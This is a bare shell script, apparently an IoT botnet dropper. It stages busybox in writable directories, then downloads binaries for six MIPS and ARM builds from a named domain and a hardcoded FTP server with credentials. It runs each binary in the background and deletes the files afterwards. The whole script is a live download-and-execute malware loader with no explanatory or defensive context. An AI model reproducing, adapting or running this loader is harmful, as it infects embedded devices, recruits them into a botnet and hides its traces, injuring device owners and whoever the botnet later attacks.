#!/bin/bash
ulimit -n 65535 2>/dev/null || true
cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /

busybox wget http://store.risesmp.cc/owo/ntb.mips
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mips ntb.mips
chmod 777 ntb.mips
./ntb.mips universal &

busybox wget http://store.risesmp.cc/owo/ntb.mipsel
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mipsel ntb.mipsel
chmod 777 ntb.mipsel
./ntb.mipsel universal &

busybox wget http://store.risesmp.cc/owo/ntb.arm5
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm5 ntb.arm5
chmod 777 ntb.arm5
./ntb.arm5 universal &

busybox wget http://store.risesmp.cc/owo/ntb.arm64
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm64 ntb.arm64
chmod 777 ntb.arm64
./ntb.arm64 universal &

busybox wget http://store.risesmp.cc/owo/ntb.arm6
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm6 ntb.arm6
chmod 777 ntb.arm6
./ntb.arm6 universal &

busybox wget http://store.risesmp.cc/owo/ntb.arm7
busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm7 ntb.arm7
chmod 777 ntb.arm7
./ntb.arm7 universal &

rm ntb.* &
